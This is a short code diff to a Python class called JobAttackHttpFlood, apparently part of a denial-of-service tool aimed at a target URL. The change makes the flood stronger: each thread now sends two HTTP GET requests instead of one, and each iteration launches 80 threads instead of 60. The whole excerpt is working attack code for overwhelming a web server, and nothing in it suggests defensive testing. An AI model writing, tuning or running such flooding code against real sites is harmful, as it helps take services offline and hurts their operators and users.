@@ -21,7 +21,8 @@ class JobAttackHttpFlood(AbstractJob):
 
     def launch_attack_in_thread(self, thread_index: int):
         print('JobAttackHttpFlood.launch_attack_in_thread(): Started thread ' + str(thread_index))
-        self.service_http.http_get(self.target_url, headers=self.service_http.get_header(), timeout=6)
+        for i in range(0,2):
+            self.service_http.http_get(self.target_url, headers=self.service_http.get_header(), timeout=6)
         print('JobAttackHttpFlood.launch_attack_in_thread(): Finished thread ' + str(thread_index))
 
     def job_iteration(self):
@@ -34,7 +35,7 @@ class JobAttackHttpFlood(AbstractJob):
             return
 
         # Launch separate threads with attacks
-        for thread_index in range(0, 60):
+        for thread_index in range(0, 80):
             thread = threading.Thread(target=self.launch_attack_in_thread, args=[thread_index])
             thread.start()
         time.sleep(3)
